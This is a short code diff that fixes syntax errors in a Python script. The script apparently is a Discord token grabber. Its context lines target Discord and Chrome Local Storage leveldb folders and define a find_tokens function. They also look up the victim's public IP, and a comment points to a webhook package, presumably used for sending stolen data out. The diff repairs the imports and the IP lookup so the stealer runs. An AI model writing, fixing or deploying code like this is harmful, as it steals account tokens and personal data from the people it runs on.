@@ -3,7 +3,7 @@
 # CTO: Martiizio
 # Don't forget to: pip install Webhook...
 
-import oss
+import os
 import sys
 import shutil
 import re
@@ -23,7 +23,7 @@ ptbtokendir = path+"\\discordptb\\Local Storage\\leveldb\\"
 canarytokendir = path+"\\discordcanary\\Local Storage\\leveldb\\"
 chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"
 
-ip = get(https://api.ipify.org).text
+ip = get('https://api.ipify.org').text
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
